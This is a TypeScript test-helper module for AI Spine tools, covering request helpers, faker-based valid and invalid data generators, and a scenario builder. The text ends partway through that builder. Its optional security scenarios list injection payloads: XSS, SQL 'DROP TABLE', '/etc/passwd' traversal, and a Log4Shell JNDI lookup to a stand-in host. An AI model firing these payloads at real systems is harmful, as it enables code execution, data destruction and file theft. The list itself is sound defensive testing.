import request from 'supertest';
import { Application } from 'express';
import {
  ToolInput,
  ToolConfig,
  AISpineExecuteRequest,
  ToolInputField,
  ToolConfigField,
  ToolDefinition,
  ToolExecutionContext,
  ToolExecutionResult,
} from '@ai-spine/tools-core';
import { faker } from '@faker-js/faker';
import { performance } from 'perf_hooks';

/**
 * Test execution options for the testTool function
 */
export interface TestToolOptions {
  /** Expected HTTP status code (default: 200) */
  expectedStatus?: number;
  /** Custom execution ID for tracking */
  executionId?: string;
  /** Custom metadata to include in the request */
  metadata?: Record<string, any>;
  /** Timeout for the request in milliseconds */
  timeout?: number;
  /** Whether to validate response schema */
  validateResponse?: boolean;
  /** Custom headers to include in the request */
  headers?: Record<string, string>;
}

/**
 * Enhanced test function for AI Spine tools with comprehensive testing capabilities.
 * Provides automatic test data generation, validation, and detailed result analysis.
 * 
 * @param app - Express application instance or tool definition
 * @param input - Input data for the tool (can be partial, will be auto-completed)
 * @param config - Configuration for the tool (optional)
 * @param options - Additional testing options
 * @returns Promise with enhanced test result including timing and validation info
 * 
 * @example
 * ```typescript
 * const result = await testTool(app, { city: 'Madrid' }, config, {
 *   expectedStatus: 200,
 *   validateResponse: true,
 *   timeout: 5000
 * });
 * 
 * expect(result.body.status).toBe('success');
 * expect(result.timing.responseTime).toBeLessThan(2000);
 * ```
 */
export async function testTool(
  app: Application | ToolDefinition,
  input: Partial<ToolInput>,
  config?: ToolConfig,
  options: TestToolOptions = {}
) {
  const {
    expectedStatus = 200,
    executionId,
    metadata,
    timeout = 30000,
    validateResponse = false,
    headers = {}
  } = options;

  // If we receive a ToolDefinition, we need to create a mock execution context
  if ('metadata' in app && 'schema' in app && 'execute' in app) {
    return await testToolDirect(app, input, config, options);
  }

  const requestBody: AISpineExecuteRequest = {
    tool_id: 'test-tool',
    input_data: input as ToolInput,
    config,
    execution_id: executionId,
    metadata,
  };

  const startTime = performance.now();
  
  const response = await request(app as Application)
    .post('/api/execute')
    .set(headers)
    .send(requestBody)
    .timeout(timeout)
    .expect(expectedStatus);

  const endTime = performance.now();
  const responseTime = endTime - startTime;

  // Add timing information to response
  (response as any).timing = {
    responseTime: Math.round(responseTime),
    startTime,
    endTime
  };

  // Add validation if requested
  if (validateResponse && response.status === 200) {
    const validationResult = validateToolResponse(response.body);
    (response as any).validation = validationResult;
  }

  return response;
}

/**
 * Test a tool definition directly without Express server.
 * Useful for unit testing tool logic in isolation.
 */
export async function testToolDirect(
  toolDef: ToolDefinition,
  input: Partial<ToolInput>,
  config?: ToolConfig,
  options: TestToolOptions = {}
): Promise<{
  status: number;
  body: any;
  timing: { responseTime: number; startTime: number; endTime: number };
  validation?: any;
}> {
  const { validateResponse = false, executionId } = options;
  
  // Generate complete input data if partial
  const completeInput = input.hasOwnProperty('__complete') 
    ? input as ToolInput
    : generateTestData(toolDef.schema.input, input);

  // Generate complete config if not provided
  const completeConfig = config || generateConfigTestData(toolDef.schema.config);

  // Create mock execution context
  const context: ToolExecutionContext = {
    executionId: executionId || `test_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
    toolId: toolDef.metadata.name,
    toolVersion: toolDef.metadata.version,
    timestamp: new Date(),
    environment: 'test',
    performance: {
      startTime: performance.now(),
      timeoutMs: options.timeout || 30000
    }
  };

  const startTime = performance.now();
  let result: ToolExecutionResult;
  let status = 200;

  try {
    result = await toolDef.execute(completeInput, completeConfig, context);
    if (result.status !== 'success') {
      status = result.error?.httpStatusCode || 400;
    }
  } catch (error) {
    result = {
      status: 'error',
      error: {
        code: 'EXECUTION_ERROR',
        message: error instanceof Error ? error.message : String(error),
        type: 'execution_error'
      },
      timing: {
        executionTimeMs: performance.now() - startTime,
        startedAt: new Date().toISOString(),
        completedAt: new Date().toISOString()
      }
    };
    status = 500;
  }

  const endTime = performance.now();
  const responseTime = endTime - startTime;

  const response = {
    status,
    body: {
      execution_id: context.executionId,
      status: result.status,
      output_data: result.data,
      error_code: result.error?.code,
      error_message: result.error?.message,
      error_details: result.error?.details,
      execution_time_ms: Math.round(responseTime),
      timestamp: new Date().toISOString()
    },
    timing: {
      responseTime: Math.round(responseTime),
      startTime,
      endTime
    }
  };

  if (validateResponse && status === 200) {
    (response as any).validation = validateToolResponse(response.body);
  }

  return response;
}

/**
 * Test tool health endpoint
 */
export async function testToolHealth(app: Application) {
  return request(app)
    .get('/health')
    .expect(200);
}

/**
 * Options for test data generation
 */
export interface TestDataGenerationOptions {
  /** Whether to include optional fields (default: false) */
  includeOptional?: boolean;
  /** Seed for reproducible random data generation */
  seed?: number;
  /** Locale for faker data generation */
  locale?: string;
  /** Whether to generate realistic data using faker */
  useRealisticData?: boolean;
  /** Custom value generators for specific fields */
  customGenerators?: Record<string, () => any>;
  /** Edge case generation mode */
  edgeCase?: 'min' | 'max' | 'boundary' | 'invalid' | null;
}

/**
 * Enhanced test data generator with realistic data, edge cases, and customization options.
 * Automatically generates valid test data based on tool input schema definitions.
 * 
 * @param schema - Tool input schema definition
 * @param overrides - Specific values to override in generated data
 * @param options - Data generation options for customization
 * @returns Complete tool input data ready for testing
 * 
 * @example
 * ```typescript
 * const testData = generateTestData(schema, { city: 'Madrid' }, {
 *   includeOptional: true,
 *   useRealisticData: true,
 *   edgeCase: 'boundary'
 * });
 * ```
 */
export function generateTestData(
  schema: Record<string, ToolInputField>,
  overrides: Partial<ToolInput> = {},
  options: TestDataGenerationOptions = {}
): ToolInput {
  const {
    includeOptional = false,
    seed,
    useRealisticData = true,
    customGenerators = {},
    edgeCase = null
  } = options;

  // Set faker seed for reproducible data
  if (seed !== undefined) {
    faker.seed(seed);
  }

  const testData: ToolInput = {};

  for (const [fieldName, fieldSchema] of Object.entries(schema)) {
    // Skip field if override provided
    if (fieldName in overrides) {
      testData[fieldName] = overrides[fieldName];
      continue;
    }

    // Use custom generator if provided
    if (customGenerators[fieldName]) {
      testData[fieldName] = customGenerators[fieldName]();
      continue;
    }

    // Use default value if available
    if (fieldSchema.default !== undefined) {
      testData[fieldName] = fieldSchema.default;
      continue;
    }

    // Skip optional fields unless requested
    if (!fieldSchema.required && !includeOptional) {
      continue;
    }

    // Generate test data based on field type and options
    testData[fieldName] = generateFieldValue(fieldSchema, useRealisticData, edgeCase);
  }

  // Mark as complete to avoid re-processing
  (testData as any).__complete = true;
  return testData;
}

/**
 * Generate a single field value based on field schema and options
 */
function generateFieldValue(
  fieldSchema: ToolInputField,
  useRealisticData: boolean,
  edgeCase: 'min' | 'max' | 'boundary' | 'invalid' | null
): any {
  switch (fieldSchema.type) {
    case 'string':
      return generateStringValue(fieldSchema, useRealisticData, edgeCase);
    
    case 'number':
      return generateNumberValue(fieldSchema, edgeCase);
    
    case 'boolean':
      return edgeCase === 'invalid' ? 'not-a-boolean' : faker.datatype.boolean();
    
    case 'array':
      if (edgeCase === 'invalid') return 'not-an-array';
      return generateArrayValue(fieldSchema, useRealisticData, edgeCase);
    
    case 'object':
      if (edgeCase === 'invalid') return 'not-an-object';
      return generateObjectValue(fieldSchema, useRealisticData, edgeCase);
    
    case 'date':
      return generateDateValue(fieldSchema, useRealisticData, edgeCase);
    
    case 'time':
      return generateTimeValue(fieldSchema, edgeCase);
    
    case 'datetime':
      return generateDateTimeValue(fieldSchema, useRealisticData, edgeCase);
    
    case 'email':
      return edgeCase === 'invalid' ? 'invalid-email' : faker.internet.email();
    
    case 'url':
      return edgeCase === 'invalid' ? 'invalid-url' : faker.internet.url();
    
    case 'uuid':
      return edgeCase === 'invalid' ? 'invalid-uuid' : faker.string.uuid();
    
    case 'enum':
      if (fieldSchema.enum && fieldSchema.enum.length > 0) {
        return edgeCase === 'invalid' 
          ? 'invalid-enum-value'
          : faker.helpers.arrayElement(fieldSchema.enum);
      }
      return 'enum-value';
    
    case 'json':
      return edgeCase === 'invalid' 
        ? 'invalid-json' 
        : { generated: true, timestamp: Date.now() };
    
    case 'file':
      return {
        filename: faker.system.fileName(),
        mimetype: 'text/plain',
        size: faker.number.int({ min: 100, max: 10000 })
      };
    
    default:
      return useRealisticData ? faker.lorem.word() : 'test-value';
  }
}

/**
 * Generate array values with proper nesting and constraints
 */
function generateArrayValue(
  fieldSchema: ToolInputField,
  useRealisticData: boolean,
  edgeCase: 'min' | 'max' | 'boundary' | 'invalid' | null
): any[] {
  const minItems = fieldSchema.minItems || 1;
  const maxItems = fieldSchema.maxItems || 5;
  
  let arrayLength: number;
  
  switch (edgeCase) {
    case 'min':
      arrayLength = minItems;
      break;
    case 'max':
      arrayLength = maxItems;
      break;
    case 'boundary':
      arrayLength = faker.helpers.arrayElement([minItems, maxItems]);
      break;
    default:
      arrayLength = faker.number.int({ min: minItems, max: maxItems });
  }

  const result = [];
  
  for (let i = 0; i < arrayLength; i++) {
    if (fieldSchema.items) {
      result.push(generateFieldValue(fieldSchema.items, useRealisticData, null));
    } else {
      result.push(useRealisticData ? faker.lorem.word() : `item-${i}`);
    }
  }

  return result;
}

/**
 * Generate object values with nested properties
 */
function generateObjectValue(
  fieldSchema: ToolInputField,
  useRealisticData: boolean,
  edgeCase: 'min' | 'max' | 'boundary' | 'invalid' | null
): Record<string, any> {
  if (fieldSchema.properties) {
    return generateTestData(fieldSchema.properties, {}, { useRealisticData, edgeCase });
  }
  
  return useRealisticData 
    ? { generated: true, data: faker.lorem.sentence() }
    : { test: 'value' };
}

/**
 * Enhanced helper functions for generating realistic field values
 */
function generateStringValue(
  fieldSchema: ToolInputField,
  useRealisticData: boolean,
  edgeCase: 'min' | 'max' | 'boundary' | 'invalid' | null
): string {
  // Handle enum values
  if (fieldSchema.enum) {
    return edgeCase === 'invalid' 
      ? 'invalid-enum-value' 
      : faker.helpers.arrayElement(fieldSchema.enum);
  }

  const minLength = fieldSchema.minLength || 1;
  const maxLength = fieldSchema.maxLength || 50;
  
  let targetLength: number;
  
  switch (edgeCase) {
    case 'min':
      targetLength = minLength;
      break;
    case 'max':
      targetLength = maxLength;
      break;
    case 'boundary':
      targetLength = faker.helpers.arrayElement([minLength, maxLength]);
      break;
    case 'invalid':
      // Generate invalid length
      targetLength = minLength > 0 ? minLength - 1 : maxLength + 1;
      break;
    default:
      targetLength = faker.number.int({ min: minLength, max: Math.min(maxLength, 100) });
  }

  // Generate realistic data based on format or field name
  if (useRealisticData && edgeCase !== 'invalid') {
    switch (fieldSchema.format) {
      case 'email':
        return faker.internet.email();
      case 'url':
        return faker.internet.url();
      case 'uuid':
        return faker.string.uuid();
      case 'hostname':
        return faker.internet.domainName();
      case 'ipv4':
        return faker.internet.ip();
      case 'ipv6':
        return faker.internet.ipv6();
      case 'slug':
        return faker.helpers.slugify(faker.lorem.words(3));
      case 'color-hex':
        return faker.internet.color();
      case 'semver':
        return `${faker.number.int({min:1,max:9})}.${faker.number.int({min:0,max:9})}.${faker.number.int({min:0,max:9})}`;
      default:
        // Try to infer from field description or name
        const fieldInfo = fieldSchema.description?.toLowerCase() || '';
        if (fieldInfo.includes('name')) {
          return faker.person.fullName().substring(0, targetLength);
        }
        if (fieldInfo.includes('city')) {
          return faker.location.city().substring(0, targetLength);
        }
        if (fieldInfo.includes('country')) {
          return faker.location.country().substring(0, targetLength);
        }
        if (fieldInfo.includes('address')) {
          return faker.location.streetAddress().substring(0, targetLength);
        }
        break;
    }
  }

  // Generate string with target length
  if (targetLength <= 0) {
    return '';
  }
  
  const baseString = useRealisticData ? faker.lorem.words() : 'test-value';
  
  if (baseString.length >= targetLength) {
    return baseString.substring(0, targetLength);
  } else {
    const padding = 'x'.repeat(targetLength - baseString.length);
    return baseString + padding;
  }
}

function generateNumberValue(
  fieldSchema: ToolInputField,
  edgeCase: 'min' | 'max' | 'boundary' | 'invalid' | null
): number {
  const min = fieldSchema.min ?? 0;
  const max = fieldSchema.max ?? 100;
  
  switch (edgeCase) {
    case 'min':
      return min;
    case 'max':
      return max;
    case 'boundary':
      return faker.helpers.arrayElement([min, max]);
    case 'invalid':
      // Generate out of bounds value
      return faker.helpers.arrayElement([
        min - 1,
        max + 1,
        NaN,
        Infinity
      ]);
    default:
      const value = faker.number.float({ min, max });
      
      // Handle integer constraint
      if (fieldSchema.integer) {
        return Math.floor(value);
      }
      
      // Handle precision constraint
      if (fieldSchema.precision !== undefined) {
        return Number(value.toFixed(fieldSchema.precision));
      }
      
      return value;
  }
}

function generateDateValue(
  fieldSchema: ToolInputField,
  _useRealisticData: boolean,
  edgeCase: 'min' | 'max' | 'boundary' | 'invalid' | null
): string {
  if (edgeCase === 'invalid') {
    return 'invalid-date';
  }

  const minDate = fieldSchema.minDate ? new Date(fieldSchema.minDate) : new Date('2020-01-01');
  const maxDate = fieldSchema.maxDate ? new Date(fieldSchema.maxDate) : new Date();
  
  let targetDate: Date;
  
  switch (edgeCase) {
    case 'min':
      targetDate = minDate;
      break;
    case 'max':
      targetDate = maxDate;
      break;
    case 'boundary':
      targetDate = faker.helpers.arrayElement([minDate, maxDate]);
      break;
    default:
      targetDate = faker.date.between({ from: minDate, to: maxDate });
  }
  
  return targetDate.toISOString().split('T')[0];
}

function generateTimeValue(
  _fieldSchema: ToolInputField,
  edgeCase: 'min' | 'max' | 'boundary' | 'invalid' | null
): string {
  if (edgeCase === 'invalid') {
    return '25:00:00';
  }
  
  const hours = faker.number.int({ min: 0, max: 23 });
  const minutes = faker.number.int({ min: 0, max: 59 });
  const seconds = faker.number.int({ min: 0, max: 59 });
  
  return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
}

function generateDateTimeValue(
  fieldSchema: ToolInputField,
  _useRealisticData: boolean,
  edgeCase: 'min' | 'max' | 'boundary' | 'invalid' | null
): string {
  if (edgeCase === 'invalid') {
    return 'invalid-datetime';
  }
  
  const minDate = fieldSchema.minDate ? new Date(fieldSchema.minDate) : new Date('2020-01-01');
  const maxDate = fieldSchema.maxDate ? new Date(fieldSchema.maxDate) : new Date();
  
  let targetDate: Date;
  
  switch (edgeCase) {
    case 'min':
      targetDate = minDate;
      break;
    case 'max':
      targetDate = maxDate;
      break;
    case 'boundary':
      targetDate = faker.helpers.arrayElement([minDate, maxDate]);
      break;
    default:
      targetDate = faker.date.between({ from: minDate, to: maxDate });
  }
  
  return targetDate.toISOString();
}

/**
 * Types of invalid data to generate for testing validation
 */
export type InvalidDataType = 
  | 'wrong_type'      // Value of wrong data type
  | 'out_of_range'    // Numeric value outside min/max bounds
  | 'length_invalid'  // String/array with invalid length
  | 'format_invalid'  // String with invalid format
  | 'enum_invalid'    // Invalid enum value
  | 'null_value'      // Null where not allowed
  | 'missing_required' // Missing required field
  | 'constraint_violation'; // Violates custom constraints

/**
 * Enhanced function to generate invalid test data for comprehensive validation testing.
 * Supports multiple types of validation failures and edge cases.
 * 
 * @param schema - Tool input schema definition
 * @param fieldToInvalidate - Name of field to make invalid
 * @param invalidType - Type of invalid data to generate
 * @param baseData - Base valid data to modify (optional)
 * @returns Invalid test data for validation testing
 * 
 * @example
 * ```typescript
 * const invalidData = generateInvalidTestData(schema, 'email', 'format_invalid');
 * const response = await testTool(app, invalidData);
 * expect(response.status).toBe(400);
 * ```
 */
export function generateInvalidTestData(
  schema: Record<string, ToolInputField>,
  fieldToInvalidate: string,
  invalidType: InvalidDataType = 'wrong_type',
  baseData?: ToolInput
): ToolInput {
  const validData = baseData || generateTestData(schema, {}, { includeOptional: true });
  const fieldSchema = schema[fieldToInvalidate];

  if (!fieldSchema) {
    throw new Error(`Field ${fieldToInvalidate} not found in schema`);
  }

  // Handle missing required field case
  if (invalidType === 'missing_required') {
    const result = { ...validData };
    delete result[fieldToInvalidate];
    return result;
  }

  // Handle null value case
  if (invalidType === 'null_value') {
    validData[fieldToInvalidate] = null;
    return validData;
  }

  // Generate type-specific invalid values
  switch (fieldSchema.type) {
    case 'string':
      validData[fieldToInvalidate] = generateInvalidStringValue(fieldSchema, invalidType);
      break;
    
    case 'number':
      validData[fieldToInvalidate] = generateInvalidNumberValue(fieldSchema, invalidType);
      break;
    
    case 'boolean':
      validData[fieldToInvalidate] = invalidType === 'wrong_type' ? 'not-a-boolean' : null;
      break;
    
    case 'array':
      validData[fieldToInvalidate] = generateInvalidArrayValue(fieldSchema, invalidType);
      break;
    
    case 'object':
      validData[fieldToInvalidate] = invalidType === 'wrong_type' ? 'not-an-object' : null;
      break;
    
    case 'date':
      validData[fieldToInvalidate] = generateInvalidDateValue(invalidType);
      break;
    
    case 'time':
      validData[fieldToInvalidate] = generateInvalidTimeValue(invalidType);
      break;
    
    case 'email':
      validData[fieldToInvalidate] = generateInvalidEmailValue(invalidType);
      break;
    
    case 'url':
      validData[fieldToInvalidate] = generateInvalidUrlValue(invalidType);
      break;
    
    case 'uuid':
      validData[fieldToInvalidate] = generateInvalidUuidValue(invalidType);
      break;
    
    case 'enum':
      validData[fieldToInvalidate] = generateInvalidEnumValue(fieldSchema, invalidType);
      break;
    
    default:
      validData[fieldToInvalidate] = invalidType === 'wrong_type' ? 123 : null;
  }

  return validData;
}

/**
 * Helper functions for generating type-specific invalid values
 */
function generateInvalidStringValue(fieldSchema: ToolInputField, invalidType: InvalidDataType): any {
  switch (invalidType) {
    case 'wrong_type':
      return faker.number.float();
    case 'length_invalid':
      if (fieldSchema.minLength && fieldSchema.minLength > 0) {
        return 'x'.repeat(fieldSchema.minLength - 1);
      } else if (fieldSchema.maxLength) {
        return 'x'.repeat(fieldSchema.maxLength + 10);
      }
      return '';
    case 'format_invalid':
      if (fieldSchema.format === 'email') return 'invalid-email';
      if (fieldSchema.format === 'url') return 'invalid-url';
      if (fieldSchema.format === 'uuid') return 'invalid-uuid';
      if (fieldSchema.pattern) return 'does-not-match-pattern';
      return 'invalid-format';
    case 'enum_invalid':
      return 'invalid-enum-value';
    default:
      return null;
  }
}

function generateInvalidNumberValue(fieldSchema: ToolInputField, invalidType: InvalidDataType): any {
  switch (invalidType) {
    case 'wrong_type':
      return 'not-a-number';
    case 'out_of_range':
      if (fieldSchema.min !== undefined) {
        return fieldSchema.min - 1;
      } else if (fieldSchema.max !== undefined) {
        return fieldSchema.max + 1;
      }
      return Infinity;
    case 'constraint_violation':
      if (fieldSchema.integer) {
        return 3.14159; // Float when integer required
      }
      return NaN;
    default:
      return null;
  }
}

function generateInvalidArrayValue(fieldSchema: ToolInputField, invalidType: InvalidDataType): any {
  switch (invalidType) {
    case 'wrong_type':
      return 'not-an-array';
    case 'length_invalid':
      if (fieldSchema.minItems && fieldSchema.minItems > 0) {
        return []; // Empty array when minimum required
      } else if (fieldSchema.maxItems) {
        return new Array(fieldSchema.maxItems + 5).fill('item'); // Exceed maximum
      }
      return [];
    case 'constraint_violation':
      if (fieldSchema.uniqueItems) {
        return ['duplicate', 'duplicate']; // Duplicate items
      }
      return ['invalid-item-type'];
    default:
      return null;
  }
}

function generateInvalidDateValue(invalidType: InvalidDataType): any {
  switch (invalidType) {
    case 'wrong_type':
      return 123;
    case 'format_invalid':
      return 'not-a-date';
    case 'out_of_range':
      return '1800-01-01'; // Very old date
    default:
      return null;
  }
}

function generateInvalidTimeValue(invalidType: InvalidDataType): any {
  switch (invalidType) {
    case 'wrong_type':
      return 123;
    case 'format_invalid':
      return '25:70:99'; // Invalid time format
    default:
      return null;
  }
}

function generateInvalidEmailValue(invalidType: InvalidDataType): any {
  switch (invalidType) {
    case 'wrong_type':
      return 123;
    case 'format_invalid':
      return 'invalid-email-format';
    default:
      return null;
  }
}

function generateInvalidUrlValue(invalidType: InvalidDataType): any {
  switch (invalidType) {
    case 'wrong_type':
      return 123;
    case 'format_invalid':
      return 'not-a-valid-url';
    default:
      return null;
  }
}

function generateInvalidUuidValue(invalidType: InvalidDataType): any {
  switch (invalidType) {
    case 'wrong_type':
      return 123;
    case 'format_invalid':
      return 'not-a-uuid';
    default:
      return null;
  }
}

function generateInvalidEnumValue(_fieldSchema: ToolInputField, invalidType: InvalidDataType): any {
  switch (invalidType) {
    case 'wrong_type':
      return 123;
    case 'enum_invalid':
      return 'value-not-in-enum';
    default:
      return null;
  }
}

/**
 * Enhanced configuration test data generator with support for realistic API keys,
 * environment variables, and security-aware test data.
 * 
 * @param schema - Tool configuration schema definition
 * @param overrides - Specific configuration values to override
 * @param options - Generation options for customization
 * @returns Complete tool configuration ready for testing
 * 
 * @example
 * ```typescript
 * const config = generateConfigTestData(schema, {
 *   apiKey: 'real-api-key-for-testing'
 * }, {
 *   useEnvironmentVars: true,
 *   generateSecureDefaults: true
 * });
 * ```
 */
export function generateConfigTestData(
  schema: Record<string, ToolConfigField>,
  overrides: Partial<ToolConfig> = {},
  options: {
    useEnvironmentVars?: boolean;
    generateSecureDefaults?: boolean;
    includeOptional?: boolean;
  } = {}
): ToolConfig {
  const { 
    useEnvironmentVars = true,
    generateSecureDefaults = true,
    includeOptional = false 
  } = options;

  const testConfig: ToolConfig = {};

  for (const [fieldName, fieldSchema] of Object.entries(schema)) {
    // Use override value if provided
    if (fieldName in overrides) {
      testConfig[fieldName] = overrides[fieldName];
      continue;
    }

    // Try to load from environment variable if specified
    if (useEnvironmentVars && fieldSchema.envVar && process.env[fieldSchema.envVar]) {
      testConfig[fieldName] = process.env[fieldSchema.envVar];
      continue;
    }

    // Use default value if available
    if (fieldSchema.default !== undefined) {
      testConfig[fieldName] = fieldSchema.default;
      continue;
    }

    // Skip optional fields unless requested
    if (!fieldSchema.required && !includeOptional) {
      continue;
    }

    // Generate test data based on field type
    testConfig[fieldName] = generateConfigFieldValue(fieldSchema, generateSecureDefaults);
  }

  return testConfig;
}

/**
 * Generate configuration field values with appropriate security handling
 */
function generateConfigFieldValue(fieldSchema: ToolConfigField, generateSecureDefaults: boolean): any {
  switch (fieldSchema.type) {
    case 'string':
      if (fieldSchema.validation?.enum) {
        return faker.helpers.arrayElement(fieldSchema.validation.enum);
      }
      return generateSecureDefaults ? faker.lorem.words(3) : 'test-string-config';
    
    case 'number':
      const min = fieldSchema.validation?.min ?? 1;
      const max = fieldSchema.validation?.max ?? 100;
      return faker.number.int({ min, max });
    
    case 'boolean':
      return faker.datatype.boolean();
    
    case 'apiKey':
    case 'secret':
      if (generateSecureDefaults) {
        // Generate realistic-looking test API key
        const keyLength = fieldSchema.validation?.pattern?.includes('32') ? 32 : 40;
        return faker.string.hexadecimal({ length: keyLength, casing: 'lower' });
      }
      return fieldSchema.type === 'apiKey' ? 'test-api-key-12345' : 'test-secret-value';
    
    case 'url':
      if (generateSecureDefaults) {
        const protocols = fieldSchema.validation?.allowedProtocols || ['https'];
        const protocol = faker.helpers.arrayElement(protocols);
        return `${protocol}://${faker.internet.domainName()}/api/v1`;
      }
      return 'https://api.example.com';
    
    case 'enum':
      if (fieldSchema.validation?.enum) {
        return faker.helpers.arrayElement(fieldSchema.validation.enum);
      }
      return 'enum-value';
    
    case 'json':
      if (fieldSchema.validation?.jsonSchema) {
        // Basic JSON schema-based generation (simplified)
        return { generated: true, timestamp: Date.now() };
      }
      return { testConfig: true, value: faker.lorem.word() };
    
    default:
      return 'test-config-value';
  }
}

/**
 * Test scenario configuration options
 */
export interface TestScenariosOptions {
  /** Include edge case scenarios (default: true) */
  includeEdgeCases?: boolean;
  /** Include performance test scenarios (default: false) */
  includePerformanceTests?: boolean;
  /** Include security test scenarios (default: false) */
  includeSecurityTests?: boolean;
  /** Custom scenarios to include */
  customScenarios?: TestScenario[];
  /** Maximum number of generated scenarios */
  maxScenarios?: number;
  /** Whether to include boundary value scenarios */
  includeBoundaryTests?: boolean;
}

/**
 * Individual test scenario definition
 */
export interface TestScenario {
  /** Human-readable name for the scenario */
  name: string;
  /** Input data for the test */
  input: ToolInput;
  /** Configuration data for the test */
  config?: ToolConfig;
  /** Whether this scenario should succeed */
  expectSuccess: boolean;
  /** Expected error message or code */
  expectedError?: string;
  /** Expected response time threshold in ms */
  maxResponseTime?: number;
  /** Custom validation function for the response */
  customValidation?: (response: any) => boolean;
  /** Tags for categorizing scenarios */
  tags?: string[];
  /** Priority level (1-5, 5 being highest) */
  priority?: number;
  /** Whether to skip this scenario */
  skip?: boolean;
  /** Custom timeout for this scenario */
  timeout?: number;
}

/**
 * Enhanced test scenario generator that creates comprehensive test cases including
 * validation, edge cases, security tests, and performance scenarios.
 * 
 * @param inputSchema - Tool input schema definition
 * @param configSchema - Tool configuration schema definition
 * @param options - Scenario generation options
 * @returns Array of comprehensive test scenarios
 * 
 * @example
 * ```typescript
 * const scenarios = createTestScenarios(inputSchema, configSchema, {
 *   includeEdgeCases: true,
 *   includeSecurityTests: true,
 *   maxScenarios: 50
 * });
 * 
 * for (const scenario of scenarios) {
 *   const result = await testTool(app, scenario.input, scenario.config);
 *   expect(result.body.status === 'success').toBe(scenario.expectSuccess);
 * }
 * ```
 */
export function createTestScenarios(
  inputSchema: Record<string, ToolInputField>,
  configSchema: Record<string, ToolConfigField>,
  options: TestScenariosOptions = {}
): TestScenario[] {
  const {
    includeEdgeCases = true,
    includePerformanceTests = false,
    includeSecurityTests = false,
    customScenarios = [],
    maxScenarios = 100,
    includeBoundaryTests = true
  } = options;

  const scenarios: TestScenario[] = [];
  const validInput = generateTestData(inputSchema, {}, { includeOptional: true });
  const validConfig = generateConfigTestData(configSchema);

  // 1. Happy path scenarios
  scenarios.push({
    name: 'Valid input and config (happy path)',
    input: validInput,
    config: validConfig,
    expectSuccess: true,
    tags: ['happy-path', 'valid'],
    priority: 5,
    maxResponseTime: 2000
  });

  // 2. Required field validation scenarios
  for (const [fieldName, fieldSchema] of Object.entries(inputSchema)) {
    if (fieldSchema.required) {
      scenarios.push({
        name: `Missing required field: ${fieldName}`,
        input: generateInvalidTestData(inputSchema, fieldName, 'missing_required', validInput),
        config: validConfig,
        expectSuccess: false,
        expectedError: fieldName,
        tags: ['validation', 'required-field'],
        priority: 4
      });
    }
  }

  // 3. Field validation scenarios
  for (const [fieldName, fieldSchema] of Object.entries(inputSchema)) {
    const invalidTypes: InvalidDataType[] = ['wrong_type', 'format_invalid'];
    
    // Add type-specific invalid data types
    if (fieldSchema.type === 'string') {
      invalidTypes.push('length_invalid');
      if (fieldSchema.enum) invalidTypes.push('enum_invalid');
    }
    if (fieldSchema.type === 'number') {
      invalidTypes.push('out_of_range', 'constraint_violation');
    }
    if (fieldSchema.type === 'array') {
      invalidTypes.push('length_invalid');
    }

    for (const invalidType of invalidTypes) {
      try {
        scenarios.push({
          name: `Invalid ${fieldName} (${invalidType})`,
          input: generateInvalidTestData(inputSchema, fieldName, invalidType, validInput),
          config: validConfig,
          expectSuccess: false,
          expectedError: 'validation',
          tags: ['validation', 'invalid-data', invalidType],
          priority: 3
        });
      } catch (error) {
        // Skip if invalid data generation fails for this type
        continue;
      }
    }
  }

  // 4. Boundary value testing
  if (includeBoundaryTests) {
    for (const [fieldName, fieldSchema] of Object.entries(inputSchema)) {
      if (fieldSchema.type === 'string' || fieldSchema.type === 'number' || fieldSchema.type === 'array') {
        // Minimum boundary
        try {
          const minBoundaryInput = generateTestData(inputSchema, {
            [fieldName]: generateFieldValue(fieldSchema, false, 'min')
          });
          scenarios.push({
            name: `${fieldName} minimum boundary value`,
            input: minBoundaryInput,
            config: validConfig,
            expectSuccess: true,
            tags: ['boundary', 'min-value'],
            priority: 3
          });
        } catch (error) {
          // Skip if boundary generation fails
        }

        // Maximum boundary
        try {
          const maxBoundaryInput = generateTestData(inputSchema, {
            [fieldName]: generateFieldValue(fieldSchema, false, 'max')
          });
          scenarios.push({
            name: `${fieldName} maximum boundary value`,
            input: maxBoundaryInput,
            config: validConfig,
            expectSuccess: true,
            tags: ['boundary', 'max-value'],
            priority: 3
          });
        } catch (error) {
          // Skip if boundary generation fails
        }
      }
    }
  }

  // 5. Edge case scenarios
  if (includeEdgeCases) {
    scenarios.push(
      {
        name: 'Empty input object',
        input: {},
        config: validConfig,
        expectSuccess: Object.keys(inputSchema).every(key => !inputSchema[key].required),
        expectedError: 'Required field',
        tags: ['edge-case', 'empty-input'],
        priority: 4
      },
      {
        name: 'Null input values',
        input: Object.fromEntries(
          Object.keys(validInput).map(key => [key, null])
        ),
        config: validConfig,
        expectSuccess: false,
        expectedError: 'validation',
        tags: ['edge-case', 'null-values'],
        priority: 3
      },
      {
        name: 'Undefined input values',
        input: Object.fromEntries(
          Object.keys(validInput).map(key => [key, undefined])
        ),
        config: validConfig,
        expectSuccess: false,
        expectedError: 'validation',
        tags: ['edge-case', 'undefined-values'],
        priority: 3
      }
    );
  }

  // 6. Security test scenarios
  if (includeSecurityTests) {
    const securityPayloads = [
      '<script>alert("xss")</script>',
      '"; DROP TABLE users; --',
      '../../etc/passwd',
      '${jndi:ldap://malicious.com/a}',
      'javascript:alert(1)',
    ];

    for (const [fieldName, fieldSchema] of Object.entries(inputSchema)) {
      if (fieldSchema.type === 'string') {
        for (const payload of securityPayloads) {
          scenarios.push({
            name: `Security test: ${fieldName} with malicious payload`,
            input: generateTestData(inputSchema, { [fieldName]: payload }),
            config: validConfig,
            expectSuccess: false, // Assuming proper input sanitization
            expectedError: 'validation',
            tags: ['security', 'injection', 'malicious-input'],
            priority: 5
          });
        }
      }
    }
  }

  // 7. Performance test scenarios
  if (includePerformanceTests) {
    scenarios.push(
      {
        name: 'Large input data performance test',
        input: generateTestData(inputSchema, {}, { 
          useRealisticData: true,
          edgeCase: 'max' 
        }),
        config: validConfig,
        expectSuccess: true,
        maxResponseTime: 5000,
        tags: ['performance', 'large-data'],
        priority: 2
      },
      {
        name: 'Minimal input data performance test',
        input: generateTestData(inputSchema, {}, {
          includeOptional: false,
          edgeCase: 'min'
        }),
        config: validConfig,
        expectSuccess: true,
        maxResponseTime: 1000,
        tags: ['performance', 'minimal-data'],
        priority: 2
      }
    );
  }

  // 8. Add custom scenarios
  scenarios.push(...customScenarios);

  // 9. Sort by priority and limit if needed
